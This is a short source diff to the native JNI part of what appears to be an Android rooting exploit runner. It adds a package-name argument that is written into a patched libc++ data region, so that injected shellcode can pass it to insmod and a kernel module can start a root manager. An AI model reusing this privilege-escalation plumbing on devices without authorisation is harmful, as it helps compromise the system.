@@ -301,6 +301,7 @@ extern uint32_t libcxx_len;
 extern char libcxx_first_inst_copy[];
 extern uint32_t libcxx_ko_target_off;
 extern uint32_t libcxx_soft_reboot_off;
+extern uint32_t libcxx_pkg_val_off;
 
 int find_hook_target(const char *lib, const char *sym,
                      uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
@@ -545,6 +546,7 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
                                                jbyteArray aesCbcKey,
                                                jbyteArray hmacKey, jint icvLen,
                                                jint senderPort,
+                                               jstring packageName,
                                                jboolean softReboot) {
     struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
 
@@ -571,6 +573,16 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
     }
     libcxx_soft_reboot = (uint8_t *)(libcxx_data + libcxx_soft_reboot_off);
     *libcxx_soft_reboot = softReboot ? 1 : 0;
+
+    /* The shellcode passes this to insmod, and the LKM runs
+     * `ksud late-load --package-name <name>`, so it has to be the installed manager. */
+    const char *pkg = (*env)->GetStringUTFChars(env, packageName, NULL);
+    if (pkg) {
+        char *pkgval = libcxx_data + libcxx_pkg_val_off;
+        strncpy(pkgval, pkg, 47);
+        pkgval[47] = '\0';
+        (*env)->ReleaseStringUTFChars(env, packageName, pkg);
+    }
 
     struct PatchRestore libcxx_r = {0};
 
